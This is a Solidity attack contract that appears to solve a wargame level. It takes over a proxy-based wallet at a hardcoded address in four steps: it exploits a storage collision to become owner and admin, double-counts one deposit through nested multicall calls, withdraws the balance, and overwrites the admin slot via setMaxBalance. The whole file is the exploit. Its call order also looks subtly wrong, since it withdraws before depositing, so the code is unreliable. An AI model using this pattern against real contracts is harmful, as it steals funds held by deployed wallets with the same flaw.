// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Level24 {
    address proxy=0xE005F019B047e2c3A69f8767bf68646B2B313821;

    constructor() payable{
        
    }

    function attack(address newOwner) public {
        uint256 owner256=uint256(bytes32(bytes20(newOwner)));
        (bool a,) = address(proxy).call(abi.encodeWithSignature("proposeNewAdmin(address)",address(this)));
         require(a);
        (bool b,) = address(proxy).call(abi.encodeWithSignature("addToWhitelist(address)",address(this)));
         require(b);
          bytes[] memory deposit=new bytes[](1);
         deposit[0]=abi.encodeWithSignature("deposit()");
         bytes memory data=abi.encodeWithSignature("multicall(bytes[])", deposit);
         bytes memory withdraw=abi.encodeWithSignature("execute(address,uint256,bytes)", address(this),0.002 ether,"");
         bytes[] memory calls=new bytes[](3);
         calls[0]=data;
         calls[1]=data;
         calls[2]=withdraw;
        (bool w,) = address(proxy).call(abi.encodeWithSignature("execute(address,uint256,bytes)",address(this),0.002 ether,""));
         require(w);
         (bool c,) = address(proxy).call{value:0.001 ether}(abi.encodeWithSignature("multicall(bytes[])",calls));
         require(c);
         (bool d,) = address(proxy).call(abi.encodeWithSignature("setMaxBalance(uint256)",owner256));
         require(d);
     
    }
}


